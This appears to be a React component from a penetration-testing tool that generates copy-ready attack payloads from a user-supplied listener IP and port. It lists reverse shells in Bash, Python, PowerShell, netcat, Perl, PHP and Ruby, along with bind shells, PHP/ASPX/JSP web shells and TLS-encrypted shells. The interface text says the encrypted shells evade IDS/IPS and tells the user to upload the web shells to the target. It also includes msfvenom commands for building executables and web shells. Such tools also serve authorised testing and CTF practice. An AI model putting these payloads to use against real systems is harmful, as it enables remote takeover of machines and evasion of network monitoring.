// @ts-nocheck
import { useState } from 'react'
import { useTargetCtx } from '../hooks/TargetContext'

const SHELLS = [
  { label: 'Bash TCP', cmd: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1` },
  { label: 'Python3', cmd: (h, p) => `python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('${h}',${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])"` },
  { label: 'PowerShell', cmd: (h, p) => `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${h}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=[text.encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` },
  { label: 'Netcat -e', cmd: (h, p) => `nc -e /bin/sh ${h} ${p}` },
  { label: 'Netcat mkfifo', cmd: (h, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f` },
  { label: 'Perl', cmd: (h, p) => `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
  { label: 'PHP', cmd: (h, p) => `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'` },
  { label: 'Ruby', cmd: (h, p) => `ruby -rsocket -e'f=TCPSocket.open("${h}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
]

const BIND_SHELLS = [
  { label: 'Netcat Bind', cmd: (h, p) => `nc -lvnp ${p} -e /bin/sh\n# Connect: nc ${h} ${p}` },
  { label: 'Python3 Bind', cmd: (h, p) => `python3 -c "import socket,os;s=socket.socket();s.bind(('0.0.0.0',${p}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system('/bin/sh')"` },
  { label: 'Socat Bind', cmd: (h, p) => `socat TCP-LISTEN:${p},reuseaddr,fork EXEC:/bin/bash\n# Connect: socat - TCP:${h}:${p}` },
  { label: 'PowerShell Bind', cmd: (h, p) => `powershell -nop -c "$l=New-Object Net.Sockets.TcpListener([IPAddress]::Any,${p});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=[text.encoding]::ASCII.GetBytes($r);$s.Write($sb,0,$sb.Length)}"` },
]

const WEB_SHELLS = [
  { label: 'PHP Simple', cmd: () => `<?php system($_GET['cmd']); ?>` },
  { label: 'PHP Stealth', cmd: () => `<?php @eval($_POST['c']); ?>` },
  { label: 'PHP Full (p0wny)', cmd: (h, p) => `<?php if(isset($_REQUEST['cmd'])){echo "<pre>".shell_exec($_REQUEST['cmd'])."</pre>";} ?>` },
  { label: 'ASPX', cmd: () => `<%@ Page Language="C#" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<% Process.Start(new ProcessStartInfo("cmd","/c "+Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd(); %>` },
  { label: 'JSP', cmd: () => `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` },
  { label: 'JSP Full', cmd: () => `<%@ page import="java.io.*" %>\n<% Process p=Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=br.readLine())!=null) out.println(l); %>` },
]

const ENCRYPTED = [
  { label: 'OpenSSL Reverse', cmd: (h, p) => `# Listener: openssl s_server -quiet -key key.pem -cert cert.pem -port ${p}\n# Generate cert: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${h}:${p} > /tmp/s; rm /tmp/s` },
  { label: 'Socat Encrypted', cmd: (h, p) => `# Generate cert: openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt && cat shell.key shell.crt > shell.pem\n# Listener: socat OPENSSL-LISTEN:${p},cert=shell.pem,verify=0 -\nsocat OPENSSL:${h}:${p},verify=0 EXEC:/bin/bash` },
  { label: 'Ncat SSL Reverse', cmd: (h, p) => `# Listener: ncat --ssl -lvnp ${p}\nncat --ssl ${h} ${p} -e /bin/bash` },
]

const MSFVENOM = [
  { label: 'Windows x64 EXE', cmd: (h, p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f exe -o shell.exe` },
  { label: 'Windows x64 DLL', cmd: (h, p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f dll -o shell.dll` },
  { label: 'Windows x64 PS1', cmd: (h, p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f psh -o shell.ps1` },
  { label: 'Linux ELF', cmd: (h, p) => `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f elf -o shell.elf` },
  { label: 'PHP Webshell', cmd: (h, p) => `msfvenom -p php/reverse_php LHOST=${h} LPORT=${p} -f raw -o shell.php` },
  { label: 'ASP Webshell', cmd: (h, p) => `msfvenom -p windows/shell_reverse_tcp LHOST=${h} LPORT=${p} -f asp -o shell.asp` },
  { label: 'ASPX Webshell', cmd: (h, p) => `msfvenom -p windows/shell_reverse_tcp LHOST=${h} LPORT=${p} -f aspx -o shell.aspx` },
  { label: 'JSP Webshell', cmd: (h, p) => `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${h} LPORT=${p} -f raw -o shell.jsp` },
  { label: 'WAR (Tomcat)', cmd: (h, p) => `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${h} LPORT=${p} -f war -o shell.war` },
  { label: 'Python', cmd: (h, p) => `msfvenom -p cmd/unix/reverse_python LHOST=${h} LPORT=${p} -f raw` },
]

function CmdOutput({ label, cmd }) {
  const [copied, setCopied] = useState(false)
  const copy = () => { navigator.clipboard.writeText(cmd); setCopied(true); setTimeout(() => setCopied(false), 1200) }
  return (
    <div style={{ marginBottom: '0.4rem' }}>
      <div className="meta-label" style={{ marginBottom: '0.2rem' }}>{label}</div>
      <div className="cmd-block" style={{ fontSize: '0.7rem' }}>
        <span className="cmd-prompt">$ </span>{cmd}
        <button className={`copy-btn ${copied ? 'copied' : ''}`} onClick={copy}>{copied ? '✓' : 'COPY'}</button>
      </div>
    </div>
  )
}

export default function PayloadGen() {
  const { target } = useTargetCtx()
  const [lhost, setLhost] = useState(target.TARGET_IP || '')
  const [lport, setLport] = useState('4444')
  const [tab, setTab] = useState('shells')

  const lists = { shells: SHELLS, bind: BIND_SHELLS, web: WEB_SHELLS, encrypted: ENCRYPTED, msf: MSFVENOM }
  const list = lists[tab] || SHELLS

  return (
    <div>
      <div className="payload-controls" style={{ display: 'flex', gap: '1rem', alignItems: 'flex-end', marginBottom: '1.5rem', background: '#0d0d0d', border: '1px solid #1a1a1a', padding: '1rem', flexWrap: 'wrap' }}>
        <div>
          <div className="meta-label" style={{ marginBottom: '0.25rem' }}>LHOST (YOUR IP)</div>
          <input value={lhost} onChange={e => setLhost(e.target.value)} placeholder="10.10.14.1" className="target-input" style={{ width: '160px' }} />
        </div>
        <div>
          <div className="meta-label" style={{ marginBottom: '0.25rem' }}>LPORT</div>
          <input value={lport} onChange={e => setLport(e.target.value)} placeholder="4444" className="target-input" style={{ width: '80px' }} />
        </div>
        <div style={{ display: 'flex', gap: '0.3rem', flexWrap: 'wrap' }}>
          {[['shells','REVERSE'],['bind','BIND'],['web','WEB SHELLS'],['encrypted','ENCRYPTED'],['msf','MSFVENOM']].map(([id, label]) => (
            <button key={id} onClick={() => setTab(id)} style={{ background: tab === id ? 'rgba(0,0,0,0.3)' : 'none', border: `1px solid ${tab === id ? 'var(--neon)' : '#2a2a2a'}`, color: tab === id ? 'var(--neon)' : '#aaa', fontFamily: 'inherit', fontSize: '0.6rem', padding: '0.25rem 0.6rem', cursor: 'pointer' }}>
              {label}
            </button>
          ))}
        </div>
        <div style={{ marginLeft: 'auto', fontSize: '0.65rem', color: '#aaa' }}>
          nc -lvnp {lport || '4444'}
          <button onClick={() => navigator.clipboard.writeText(`nc -lvnp ${lport || '4444'}`)} style={{ marginLeft: '0.5rem', background: 'none', border: '1px solid #2a2a2a', color: '#aaa', fontFamily: 'inherit', fontSize: '0.6rem', padding: '1px 6px', cursor: 'pointer' }}>COPY</button>
        </div>
      </div>

      {tab === 'web' && (
        <div style={{ fontSize: '0.6rem', color: '#888', marginBottom: '0.75rem', borderLeft: '2px solid #ff9900', paddingLeft: '0.6rem' }}>
          Upload these to the target. Access via: <span style={{ color: 'var(--neon)' }}>http://target/shell.php?cmd=whoami</span>
        </div>
      )}
      {tab === 'encrypted' && (
        <div style={{ fontSize: '0.6rem', color: '#888', marginBottom: '0.75rem', borderLeft: '2px solid #00ccff', paddingLeft: '0.6rem' }}>
          Encrypted shells evade IDS/IPS. Traffic is TLS-wrapped — invisible to network monitoring.
        </div>
      )}
      {tab === 'bind' && (
        <div style={{ fontSize: '0.6rem', color: '#888', marginBottom: '0.75rem', borderLeft: '2px solid var(--neon)', paddingLeft: '0.6rem' }}>
          Bind shells listen on the target. Use when you can't receive connections (firewall egress filtering).
        </div>
      )}

      <div className="payload-grid" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.5rem' }}>
        {list.map(s => (
          <CmdOutput key={s.label} label={s.label} cmd={s.cmd(lhost || 'LHOST', lport || 'LPORT')} />
        ))}
      </div>
    </div>
  )
}
